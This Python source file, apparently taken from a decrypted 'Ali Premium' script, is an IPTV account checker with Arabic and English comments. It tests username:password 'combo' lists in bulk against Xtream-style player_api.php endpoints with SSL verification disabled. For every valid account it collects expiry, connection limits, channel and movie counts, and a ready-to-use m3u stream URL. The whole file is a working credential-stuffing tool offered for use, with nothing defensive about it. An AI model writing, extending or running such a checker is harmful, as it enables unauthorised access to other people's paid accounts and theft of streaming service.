#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IPTV API Extractor - استخراج API من سكريبت Ali Premium
مُستخرج من: Ali_Premium-dec.txt
الغرض: توفير API نظيف لفحص بيانات اعتماد IPTV
"""

import requests
import json
import time
import re
from datetime import datetime, timedelta
from urllib3.exceptions import InsecureRequestWarning
from typing import Dict, List, Optional, Tuple

# تعطيل تحذيرات SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class IPTVChecker:
    """
    فئة لفحص واختبار بيانات اعتماد IPTV
    Class for checking and testing IPTV credentials
    """
    
    def __init__(self, timeout: int = 15):
        """
        تهيئة الفاحص
        Initialize the checker
        
        Args:
            timeout: مهلة الاتصال بالثواني
        """
        self.timeout = timeout
        self.session = requests.Session()
        self.headers = {
            'Cookie': 'stb_lang=en; timezone=Europe%2FIstanbul;',
            'X-User-Agent': 'Model: MAG322; Link: Ethernet',
            'Accept': '*/*',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/4.7.1'
        }
        self.session.headers.update(self.headers)
    
    def check_credentials(self, host: str, username: str, password: str) -> Dict:
        """
        فحص صحة بيانات الاعتماد
        Check the validity of credentials
        
        Args:
            host: عنوان الخادم (بدون http://)
            username: اسم المستخدم
            password: كلمة المرور
            
        Returns:
            Dict: نتيجة الفحص مع المعلومات
        """
        result = {
            'valid': False,
            'host': host,
            'username': username,
            'password': password,
            'error': None,
            'account_info': {}
        }
        
        try:
            # تنظيف URL
            clean_host = host.replace('http://', '').replace('https://', '').replace('/', '')
            url = f"http://{clean_host}/player_api.php?username={username}&password={password}"
            
            # إرسال الطلب
            response = self.session.get(url, timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'user_info' in data:
                        result['valid'] = True
                        result['account_info'] = self._parse_account_info(data, clean_host, username, password)
                    else:
                        result['error'] = 'Invalid credentials or server response'
                except json.JSONDecodeError:
                    result['error'] = 'Invalid JSON response'
            else:
                result['error'] = f'HTTP {response.status_code}'
                
        except requests.RequestException as e:
            result['error'] = f'Connection error: {str(e)}'
        except Exception as e:
            result['error'] = f'Unexpected error: {str(e)}'
        
        return result
    
    def _parse_account_info(self, data: Dict, host: str, username: str, password: str) -> Dict:
        """
        تحليل معلومات الحساب من الاستجابة
        Parse account information from response
        """
        user_info = data.get('user_info', {})
        server_info = data.get('server_info', {})
        
        # تحويل timestamps
        created_at = user_info.get('created_at')
        exp_date = user_info.get('exp_date')
        
        created_date = 'Unknown'
        expiry_date = 'Unknown'
        days_remaining = 0
        
        if created_at and created_at != 'null':
            try:
                created_date = datetime.fromtimestamp(int(created_at)).strftime('%Y-%m-%d %H:%M:%S')
            except:
                created_date = 'Invalid date'
        
        if exp_date and exp_date != 'null':
            try:
                exp_datetime = datetime.fromtimestamp(int(exp_date))
                expiry_date = exp_datetime.strftime('%Y-%m-%d %H:%M:%S')
                days_remaining = (exp_datetime - datetime.now()).days
            except:
                expiry_date = 'Invalid date'
        elif exp_date == 'null':
            expiry_date = 'Unlimited'
            days_remaining = -1  # -1 indicates unlimited
        
        return {
            'username': user_info.get('username', username),
            'password': user_info.get('password', password),
            'status': user_info.get('status', 'Unknown'),
            'active_connections': user_info.get('active_cons', 0),
            'max_connections': user_info.get('max_connections', 0),
            'created_at': created_date,
            'expiry_date': expiry_date,
            'days_remaining': days_remaining,
            'timezone': server_info.get('timezone', 'Unknown'),
            'server_url': server_info.get('url', f'http://{host}'),
            'server_port': server_info.get('port', '80'),
            'm3u_url': f"http://{host}/get.php?username={username}&password={password}&type=m3u_plus"
        }
    
    def get_channels_count(self, host: str, username: str, password: str) -> Dict[str, int]:
        """
        الحصول على عدد القنوات والأفلام والمسلسلات
        Get count of channels, movies, and series
        """
        counts = {'live_channels': 0, 'movies': 0, 'series': 0}
        clean_host = host.replace('http://', '').replace('https://', '').replace('/', '')
        
        endpoints = {
            'live_channels': f"http://{clean_host}/player_api.php?username={username}&password={password}&action=get_live_streams",
            'movies': f"http://{clean_host}/player_api.php?username={username}&password={password}&action=get_vod_streams",
            'series': f"http://{clean_host}/player_api.php?username={username}&password={password}&action=get_series"
        }
        
        for content_type, url in endpoints.items():
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                if response.status_code == 200:
                    content = response.text
                    if content_type == 'series':
                        counts[content_type] = content.count('series_id')
                    else:
                        counts[content_type] = content.count('stream_id')
            except:
                continue
        
        return counts
    
    def get_categories(self, host: str, username: str, password: str) -> List[str]:
        """
        الحصول على فئات القنوات
        Get channel categories
        """
        categories = []
        clean_host = host.replace('http://', '').replace('https://', '').replace('/', '')
        url = f"http://{clean_host}/player_api.php?username={username}&password={password}&action=get_live_categories"
        
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            if response.status_code == 200:
                data = response.text
                for category_match in re.finditer(r'category_name":"([^"]*)"', data):
                    category_name = category_match.group(1).replace('\\/', '/')
                    if category_name and category_name not in categories:
                        categories.append(category_name)
        except:
            pass
        
        return categories
    
    def bulk_check(self, credentials_list: List[Tuple[str, str, str]], 
                   progress_callback=None) -> List[Dict]:
        """
        فحص مجموعة من بيانات الاعتماد
        Bulk check multiple credentials
        
        Args:
            credentials_list: قائمة من (host, username, password)
            progress_callback: دالة لتتبع التقدم
            
        Returns:
            List[Dict]: قائمة بنتائج الفحص
        """
        results = []
        total = len(credentials_list)
        
        for i, (host, username, password) in enumerate(credentials_list):
            result = self.check_credentials(host, username, password)
            
            # إضافة معلومات إضافية للحسابات الصالحة
            if result['valid']:
                counts = self.get_channels_count(host, username, password)
                categories = self.get_categories(host, username, password)
                result['account_info'].update({
                    'channels_count': counts,
                    'categories': categories
                })
            
            results.append(result)
            
            # استدعاء callback للتقدم
            if progress_callback:
                progress_callback(i + 1, total, result)
        
        return results

class IPTVAPIServer:
    """
    خادم API بسيط لخدمات IPTV
    Simple API server for IPTV services
    """
    
    def __init__(self):
        self.checker = IPTVChecker()
    
    def check_single_account(self, host: str, username: str, password: str) -> Dict:
        """
        API endpoint لفحص حساب واحد
        API endpoint to check single account
        """
        result = self.checker.check_credentials(host, username, password)
        
        if result['valid']:
            # إضافة معلومات إضافية
            counts = self.checker.get_channels_count(host, username, password)
            categories = self.checker.get_categories(host, username, password)
            result['account_info'].update({
                'channels_count': counts,
                'categories': categories[:10]  # أول 10 فئات فقط
            })
        
        return {
            'success': True,
            'data': result,
            'timestamp': datetime.now().isoformat()
        }
    
    def validate_combo_format(self, combo_line: str) -> Tuple[bool, str, str]:
        """
        التحقق من صيغة combo line
        Validate combo line format
        """
        pattern = r'^([^:]+):([^:]+)$'
        match = re.match(pattern, combo_line.strip())
        
        if match:
            return True, match.group(1).strip(), match.group(2).strip()
        return False, '', ''
    
    def process_combo_list(self, combo_lines: List[str], host: str) -> Dict:
        """
        معالجة قائمة من combos
        Process list of combos
        """
        results = {
            'total_checked': 0,
            'valid_accounts': 0,
            'invalid_accounts': 0,
            'errors': 0,
            'accounts': []
        }
        
        for line in combo_lines:
            is_valid_format, username, password = self.validate_combo_format(line)
            
            if not is_valid_format:
                results['errors'] += 1
                continue
            
            result = self.checker.check_credentials(host, username, password)
            results['total_checked'] += 1
            
            if result['valid']:
                results['valid_accounts'] += 1
                # إضافة معلومات مبسطة للحسابات الصالحة
                counts = self.checker.get_channels_count(host, username, password)
                account_summary = {
                    'username': username,
                    'password': password,
                    'status': result['account_info'].get('status'),
                    'expiry_date': result['account_info'].get('expiry_date'),
                    'days_remaining': result['account_info'].get('days_remaining'),
                    'channels_count': counts,
                    'm3u_url': result['account_info'].get('m3u_url')
                }
                results['accounts'].append(account_summary)
            else:
                results['invalid_accounts'] += 1
        
        return {
            'success': True,
            'data': results,
            'timestamp': datetime.now().isoformat()
        }

# مثال على الاستخدام - Usage Example
if __name__ == "__main__":
    # إنشاء مثيل من الفاحص
    api_server = IPTVAPIServer()
    
    # مثال على فحص حساب واحد
    result = api_server.check_single_account(
        host="example.com:8080",
        username="test_user",
        password="test_pass"
    )
    
    print("نتيجة فحص الحساب:")
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    # مثال على فحص مجموعة combos
    combo_lines = [
        "user1:pass1",
        "user2:pass2",
        "user3:pass3"
    ]
    
    bulk_result = api_server.process_combo_list(combo_lines, "example.com:8080")
    print("\nنتيجة فحص المجموعة:")
    print(json.dumps(bulk_result, indent=2, ensure_ascii=False))